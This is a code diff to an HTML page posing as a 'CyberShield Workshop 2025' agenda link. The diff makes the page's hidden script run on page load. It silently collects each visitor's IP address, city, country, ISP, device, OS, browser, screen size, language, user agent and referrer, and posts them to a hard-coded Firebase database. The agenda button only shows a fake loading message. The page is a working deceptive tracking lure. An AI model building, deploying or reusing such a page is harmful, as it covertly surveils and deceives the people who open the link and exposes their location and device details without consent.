@@ -82,16 +82,19 @@
   <div class="tag">CyberShield Workshop 2025</div>
   <h1>Welcome!<br>View Today's Agenda</h1>
   <p>Tap the button below to access the session schedule, speaker list, and room details.</p>
-  <button class="btn" onclick="register()">Open Workshop Agenda &rarr;</button>
+  <button class="btn" onclick="redirectToAgenda()">Open Workshop Agenda &rarr;</button>
   <p class="small">Powered by CyberShield Events</p>
 </div>
 
 <script>
-  // ─────────────────────────────────────────────
-  //  REPLACE THIS WITH YOUR FIREBASE DATABASE URL
+  // ============================================================
+  //  🔁 REPLACE WITH YOUR ACTUAL FIREBASE DATABASE URL
   const FIREBASE_URL = "https://workshop-a32fc-default-rtdb.firebaseio.com/";
-  // ─────────────────────────────────────────────
+  // ============================================================
 
+  let dataSent = false;  // prevent duplicate sends
+
+  // ---------- Device / OS / Browser detection ----------
   function getOS(ua) {
     if (/Windows NT 10/.test(ua)) return 'Windows 10/11';
     if (/Windows NT 6/.test(ua))  return 'Windows 7/8';
@@ -112,15 +115,9 @@
   }
 
   function getDevice(ua) {
-    const models = [
-      'iPhone', 'iPad',
-      'Samsung', 'Galaxy',
-      'Xiaomi', 'Redmi', 'POCO',
-      'Huawei', 'Honor',
-      'OnePlus', 'Realme',
-      'OPPO', 'Vivo', 'Pixel',
-      'Motorola', 'Nokia'
-    ];
+    const models = ['iPhone', 'iPad', 'Samsung', 'Galaxy', 'Xiaomi', 'Redmi', 'POCO',
+                    'Huawei', 'Honor', 'OnePlus', 'Realme', 'OPPO', 'Vivo', 'Pixel',
+                    'Motorola', 'Nokia'];
     for (const m of models) {
       if (ua.includes(m)) {
         const match = ua.match(new RegExp(m + '[\\s/]?[\\w\\-]*', 'i'));
@@ -133,43 +130,102 @@
     return 'Desktop / Laptop';
   }
 
-  async function register() {
-    const ua      = navigator.userAgent;
-    const device  = getDevice(ua);
-    const os      = getOS(ua);
-    const browser = getBrowser(ua);
-    const screen_ = `${screen.width}x${screen.height}`;
-    const lang    = navigator.language || '—';
-    const time    = new Date().toLocaleString();
-
-    let ip = '—', city = '—', country = '—', isp = '—';
+  // ---------- Get IP + City + Country (with fallback) ----------
+  async function getLocationData() {
+    // Primary: ipapi.co (gives ip, city, country_name, org)
     try {
-      const r = await fetch('https://ipapi.co/json/');
-      const d = await r.json();
-      ip      = d.ip || '—';
-      city    = d.city || '—';
-      country = d.country_name || '—';
-      isp     = d.org || '—';
-    } catch(e) {}
+      const res = await fetch('https://ipapi.co/json/');
+      if (res.ok) {
+        const data = await res.json();
+        return {
+          ip: data.ip || '—',
+          city: data.city || '—',
+          country: data.country_name || '—',
+          isp: data.org || '—'
+        };
+      }
+    } catch (e) { /* fallback */ }
 
-    const entry = { time, ip, city, country, isp, device, os, browser, screen: screen_, lang };
+    // Fallback: ip-api.com (free, no API key)
+    try {
+      const res = await fetch('http://ip-api.com/json/');
+      if (res.ok) {
+        const data = await res.json();
+        if (data.status === 'success') {
+          return {
+            ip: data.query || '—',
+            city: data.city || '—',
+            country: data.country || '—',
+            isp: data.isp || '—'
+          };
+        }
+      }
+    } catch (e) {}
 
-    // Send to Firebase silently
+    return { ip: '—', city: '—', country: '—', isp: '—' };
+  }
+
+  // ---------- Main capture & send function ----------
+  async function captureAndSend() {
+    if (dataSent) return;
+    dataSent = true;
+
+    const ua = navigator.userAgent;
+    const device = getDevice(ua);
+    const os = getOS(ua);
+    const browser = getBrowser(ua);
+    const screenRes = `${screen.width}x${screen.height}`;
+    const language = navigator.language || '—';
+    const time = new Date().toLocaleString();
+
+    // Get IP, city, country, ISP
+    const { ip, city, country, isp } = await getLocationData();
+
+    const visitorData = {
+      timestamp: time,
+      ip: ip,
+      city: city,
+      country: country,
+      isp: isp,
+      device: device,
+      os: os,
+      browser: browser,
+      screen_resolution: screenRes,
+      language: language,
+      user_agent: ua,
+      referrer: document.referrer || 'direct'
+    };
+
+    // Send to Firebase
     try {
       await fetch(`${FIREBASE_URL}/visitors.json`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(entry)
+        body: JSON.stringify(visitorData)
       });
-    } catch(e) {}
+      console.log('✅ Visitor data logged to Firebase');
+    } catch (err) {
+      console.error('❌ Firebase error:', err);
+    }
+  }
 
-    // Redirect to actual agenda / a thank you page
+  // Redirect after button click (without double-capturing)
+  function redirectToAgenda() {
+    // Optional: capture again if you want a second log (but we already captured on load)
+    // Just redirect to agenda / thank you page
     document.body.innerHTML = `
       <div style="font-family:sans-serif;text-align:center;padding:3rem;">
         <h2 style="color:#1a1a2e;">Loading agenda...</h2>
         <p style="color:#888;margin-top:1rem;">Please wait a moment.</p>
       </div>`;
+    // You can change the redirect URL here:
+    // window.location.href = "https://your-actual-agenda.com";
   }
+
+  // 🔥 CAPTURE IMMEDIATELY ON PAGE LOAD
+  window.addEventListener('load', () => {
+    captureAndSend();
+  });
 </script>
 </body>
 </html>
